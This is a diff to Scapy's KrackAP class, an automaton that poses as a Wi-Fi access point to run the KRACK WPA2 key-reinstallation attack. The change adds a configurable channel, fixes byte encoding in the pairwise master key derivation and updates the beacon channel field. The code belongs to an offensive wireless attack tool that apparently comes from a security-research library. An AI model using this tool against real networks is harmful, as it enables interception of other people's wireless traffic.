@@ -12,7 +12,8 @@ from scapy.automaton import ATMT, Automaton
 from scapy.base_classes import Net
 from scapy.config import conf
 from scapy.compat import raw, hex_bytes, chb
-from scapy.error import log_runtime
+from scapy.consts import WINDOWS
+from scapy.error import log_runtime, Scapy_Exception
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11AssoReq, Dot11AssoResp, \
     Dot11Auth, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp
 from scapy.layers.eap import EAPOL
@@ -67,6 +68,7 @@ class KrackAP(Automaton):
         super(KrackAP, self).__init__(*args, **kargs)
 
     def parse_args(self, ap_mac, ssid, passphrase,
+                   channel=None,
                    # KRACK attack options
                    double_3handshake=True,
                    encrypt_3handshake=True,
@@ -82,6 +84,9 @@ class KrackAP(Automaton):
         @ap_mac: AP's MAC
         @ssid: AP's SSID
         @passphrase: AP's Passphrase (min 8 char.)
+
+        Optional arguments:
+        @channel: used by the interface. Default 6, autodetected on windows
 
         Krack attacks options:
 
@@ -103,6 +108,15 @@ class KrackAP(Automaton):
         self.mac = ap_mac
         self.ssid = ssid
         self.passphrase = passphrase
+        if channel is None:
+            if WINDOWS:
+                try:
+                    channel = kwargs.get("iface", conf.iface).channel()
+                except (Scapy_Exception, AttributeError):
+                    channel = 6
+            else:
+                channel = 6
+        self.channel = channel
 
         # Internal structures
         self.last_iv = None
@@ -155,10 +169,10 @@ class KrackAP(Automaton):
         self.pmk = PBKDF2HMAC(
             algorithm=hashes.SHA1(),
             length=32,
-            salt=self.ssid,
+            salt=self.ssid.encode(),
             iterations=4096,
             backend=default_backend(),
-        ).derive(self.passphrase)
+        ).derive(self.passphrase.encode())
 
     def install_unicast_keys(self, client_nonce):
         """Use the client nonce @client_nonce to compute and install
@@ -203,7 +217,6 @@ class KrackAP(Automaton):
     def build_ap_info_pkt(self, layer_cls, dest):
         """Build a packet with info describing the current AP
         For beacon / proberesp use
-        Assume the AP is on channel 6
         """
         return RadioTap() \
               / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
@@ -211,7 +224,7 @@ class KrackAP(Automaton):
                           cap='ESS+privacy') \
               / Dot11Elt(ID="SSID", info=self.ssid) \
               / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18$') \
-              / Dot11Elt(ID="DSset", info=b"\x06") \
+              / Dot11Elt(ID="DSset", info=chb(self.channel)) \
               / Dot11Elt(
                   ID="RSNinfo",
                   info=b'\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02'\
